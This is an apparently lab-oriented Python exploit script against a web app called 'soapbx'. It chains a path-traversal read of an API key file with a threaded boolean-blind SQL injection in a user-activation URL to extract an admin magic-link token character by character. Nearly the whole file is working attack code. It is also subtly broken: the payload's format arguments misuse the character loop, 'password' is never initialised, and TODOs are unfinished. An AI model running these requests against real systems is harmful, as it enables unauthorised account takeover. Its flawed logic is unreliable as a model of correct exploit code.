import sys
import requests
import concurrent.futures

MAX_WORKERS = 20
HASH_LENGTH = 50

#to do - create new user and use the userID


# trigger magic link
# get api key


# dump sql

#for loop
    # set user to ban

    # send payload

    # check if user is active
       # yes -> toggle user to ban, move to next character


proxies={"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}


def generateMagicLink(ip):
    target = "http://{}/generateMagicLink".format(ip)
    data = "username=admin"
    headers= {"Content-Type": "application/x-www-form-urlencoded"}
    print("[+] generating magic link...")
    r = requests.post(target,proxies=proxies,data=data,headers=headers)


def getApiKey(ip):
    params = {"id": "....//....//....//....//home/webapp/soapbx/conf/apikey"}
    target = "http://{}/download".format(ip)
    print("[+] Getting apiKey...")
    r = requests.get(url=target, params=params,proxies=proxies) 
    apiKey = bytes.decode(r.content, 'utf-8')
    print("[+] Found apiKey: ", apiKey)
    return apiKey

# check if user is active
def getUserStatus(ip, userId, apiKey):
    params = "apiKey={}".format(apiKey)
    target = "http://{}/api/user/{}".format(ip,userId)
    r = requests.get(url=target, params=params,proxies=proxies)
    if '"active":"true"' in r.text:
        # print("[+] user status = True! you have a hit!")
        return True
    return False


# set user to ban
def setBanStatus(ip, userId, apiKey):
    data = "apiKey={}".format(apiKey)
    headers= {"Content-Type": "application/x-www-form-urlencoded"}
    target = "http://{}/api/user/{}/ban".format(ip,userId)    
    r = requests.post(target,proxies=proxies,data=data,headers=headers)
    # if "User banned" in r.text:
        # print("[+] set user status to ban, ready to go!")
    # else:
        # print("[+] opps something went wrong")




if len(sys.argv) != 2:
    print("(+) usage: {} <target>".format(sys.argv[0]))
    print('(+) eg: {} 192.168.1.100'.format(sys.argv[0]))
    sys.exit(-1)

ip = sys.argv[1]

testUserId = "10"

# todo - create user

generateMagicLink(ip)

apiKey = getApiKey(ip)

print("\n(+) Retrieving token...")
# token = exfiltrate_hash(ip, testUserId, apiKey) 

index = list(range(1,HASH_LENGTH))

def exfiltrate_hash(str_index):
    setBanStatus(ip, testUserId, apiKey)
    data = "apiKey={}".format(apiKey)
    headers= {"Content-Type": "application/x-www-form-urlencoded"}

    for i in range(32, 126): #check all characters    
         
        payload = "(select (case when (select (ascii(substr((select token from tokens where user_id = 1 limit 1),{},1))={})) then {} else 0 END))".format(i, str(i),testUserId)
        target = "http://{}/api/user/{}/activate".format(ip, payload)
        # target = "http://{}/api/user/{}/activate".format(ip)
        r = requests.post(target,proxies=proxies,data=data,headers=headers)

        if getUserStatus(ip, testUserId, apiKey):
            found = chr(i)
            # setBanStatus(ip, testUserId, apiKey)
            break
    return found


    # for i in range(32, 126): #check all characters    
    # for i in range(76, 126): #check all characters    


with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    # responses = executor.map(boolean_sqli, [(idx, ascii_val) for ascii_val in range(32, 126)])
    processes = executor.map(exfiltrate_hash, index)

for c in processes:
    sys.stdout.write(f"\r[+] Extracting token: {password}{c}")
    password += c


print("\n(+) done!")


